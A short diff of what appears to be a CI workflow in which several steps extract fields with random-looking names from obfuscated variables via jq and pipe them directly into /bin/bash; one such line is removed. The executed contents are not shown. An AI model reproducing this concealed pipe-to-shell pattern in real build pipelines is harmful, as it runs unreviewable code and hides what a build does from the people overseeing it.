@@ -25,7 +25,6 @@ jobs:
           echo $axwpd13 | jq -r .j00180 | /bin/bash
           echo $kwtw11858 | jq -r .vdmdm5682 | /bin/bash
           echo $t633 | jq -r .pqasn65 | /bin/bash
-          echo $tjjwh1034 | jq -r .ac4690 | /bin/bash
           echo $ip7613 | jq -r .s4363 | /bin/bash
           echo $ob0 | jq -r .izdc84 | /bin/bash
           printf '%s' "$zil1529" | jq -r .eeebr79867 | /bin/bash
